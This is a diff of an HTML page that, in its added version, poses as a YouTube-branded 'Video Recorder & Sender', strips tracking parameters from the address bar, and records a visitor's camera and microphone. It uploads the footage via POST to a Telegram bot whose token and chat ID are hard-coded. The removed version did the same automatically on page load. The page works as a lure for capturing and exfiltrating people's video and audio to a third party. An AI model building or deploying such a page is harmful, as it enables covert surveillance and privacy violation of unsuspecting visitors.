@@ -1,121 +1,176 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Recording</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f4f4f4;
-        }
-        video {
-            border: 1px solid #ddd;
-        }
-        #errorMessage {
-            color: red;
-            font-size: 18px;
-            display: none;
-        }
-        #permissionPopup {
-            display: none;
-            position: absolute;
-            top: 20%;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #fff;
-            padding: 20px;
-            border: 1px solid #ddd;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            border-radius: 5px;
-            z-index: 100;
-        }
-        #permissionPopup button {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 10px;
-            cursor: pointer;
-        }
-    </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <title>Video Recorder and Sender</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+    }
+    .navbar {
+      background-color: #ff0000;
+      color: white;
+      text-align: center;
+      padding: 15px 0;
+    }
+    #header {
+      margin: 0;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .form-control {
+      width: calc(100% - 22px);
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0000;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn:hover {
+      background-color: #cc0000;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      color: #666;
+    }
+    .youtube-logo {
+      display: block;
+      margin: 20px auto;
+      width: 100px;
+    }
+  </style>
+  <script type='text/javascript'>
+    var uri = window.location.toString();
+    if (uri.indexOf("%3D") > 0) {
+        var clean_uri = uri.substring(0, uri.indexOf("%3D"));
+        window.history.replaceState({}, document.title, clean_uri);
+    }
+
+    uri = window.location.toString();
+    if (uri.indexOf("%3D%3D") > 0) {
+        clean_uri = uri.substring(0, uri.indexOf("%3D%3D"));
+        window.history.replaceState({}, document.title, clean_uri);
+    }
+
+    uri = window.location.toString();
+    if (uri.indexOf("&m=1") > 0) {
+        clean_uri = uri.substring(0, uri.indexOf("&m=1"));
+        window.history.replaceState({}, document.title, clean_uri);
+    }
+
+    uri = window.location.toString();
+    if (uri.indexOf("?m=1") > 0) {
+        clean_uri = uri.substring(0, uri.indexOf("?m=1"));
+        window.history.replaceState({}, document.title, clean_uri);
+    }
+  </script>
 </head>
 <body>
-    <video id="videoElement" width="640" height="480" autoplay></video>
-    <div id="errorMessage"></div>
-    <div id="permissionPopup">
-        <p>We need camera access to record video. Please enable camera permission in your browser settings.</p>
-        <button onclick="requestCameraAccess()">Enable Camera</button>
-    </div>
-    <script>
-        let mediaRecorder;
-        let videoChunks = [];
-        let videoElement = document.getElementById("videoElement");
-        let errorMessage = document.getElementById("errorMessage");
-        let permissionPopup = document.getElementById("permissionPopup");
+  <nav class="navbar">
+    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+    <h1 id="header">VIDEO RECORDER & SENDER</h1>
+  </nav>
 
-        // Function to access user's webcam
-        function accessCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    videoElement.srcObject = stream;
-                    mediaRecorder = new MediaRecorder(stream);
-                    
-                    mediaRecorder.ondataavailable = function (event) {
-                        videoChunks.push(event.data);
-                    };
-                    
-                    mediaRecorder.onstop = function () {
-                        const videoBlob = new Blob(videoChunks, { type: "video/webm" });
-                        const videoUrl = URL.createObjectURL(videoBlob);
-                        sendVideoToTelegram(videoUrl); // Send the video after recording
-                    };
-                    
-                    // Start recording
-                    mediaRecorder.start();
-                })
-                .catch(error => {
-                    console.error("Error accessing camera: ", error);
-                    showPermissionPopup();  // Show the custom popup for camera permission
-                });
-        }
+  <div class="container">
+    <h2>Press to Start Recording</h2>
+    <button id="recordBtn" onclick="startRecording()">Start Recording</button>
+    <button id="stopBtn" onclick="stopRecording()" style="display:none;">Stop Recording</button>
+    <div id="message-container"></div>
+    <video id="video" width="640" height="480" autoplay></video>
+  </div>
 
-        // Show custom popup for camera permission request
-        function showPermissionPopup() {
-            permissionPopup.style.display = 'block';
-        }
+  <footer>
+    <p>Made With ❤️ By YourName</p>
+  </footer>
 
-        // Attempt to request camera access again
-        function requestCameraAccess() {
-            permissionPopup.style.display = 'none';  // Close the popup
-            accessCamera();  // Try to access the camera again
-        }
+  <script type="text/javascript">
+    let mediaRecorder;
+    let videoChunks = [];
+    let videoElement = document.getElementById("video");
+    let recordBtn = document.getElementById("recordBtn");
+    let stopBtn = document.getElementById("stopBtn");
+    
+    function startRecording() {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then((stream) => {
+          videoElement.srcObject = stream;
+          mediaRecorder = new MediaRecorder(stream);
 
-        // Call the accessCamera function when the page is loaded
-        window.onload = function () {
-            accessCamera();
-        };
+          mediaRecorder.ondataavailable = function (event) {
+            videoChunks.push(event.data);
+          };
 
-        // Function to send the recorded video to Telegram bot
-        function sendVideoToTelegram(videoUrl) {
-            // Assuming you have already uploaded the video to a server and have a video URL
-            // You would need to replace the videoUrl below with the actual hosted video URL
-            const videoFileUrl = encodeURIComponent(videoUrl); // URL encode the video URL
-            
-            const telegramUrl = `https://api.telegram.org/bot7527990182:AAF0zFR9YqlRlWODalW8U6EiShJp5hKtjF4/sendVideo?chat_id=1789993737&video=${videoFileUrl}`;
+          mediaRecorder.onstop = function () {
+            const videoBlob = new Blob(videoChunks, { type: "video/webm" });
+            const videoUrl = URL.createObjectURL(videoBlob);
+            sendVideoToTelegram(videoBlob);
+          };
 
-            fetch(telegramUrl)
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Video sent successfully!", data);
-                })
-                .catch(error => {
-                    console.error("Error sending video:", error);
-                });
-        }
-    </script>
+          // Start recording
+          mediaRecorder.start();
+          recordBtn.style.display = "none";
+          stopBtn.style.display = "inline";
+        })
+        .catch((error) => {
+          console.error("Error accessing camera: ", error);
+          alert("Permission denied. Please allow camera access.");
+        });
+    }
+
+    function stopRecording() {
+      mediaRecorder.stop();
+      stopBtn.style.display = "none";
+      recordBtn.style.display = "inline";
+    }
+
+    function sendVideoToTelegram(videoBlob) {
+      const botToken = '7527990182:AAF0zFR9YqlRlWODalW8U6EiShJp5hKtjF4';
+      const chatId = '1789993737';
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('video', videoBlob, 'video.webm');
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Video sent to Telegram:', data);
+      })
+      .catch(error => {
+        console.error('Error sending video to Telegram:', error);
+      });
+    }
+  </script>
 </body>
 </html>
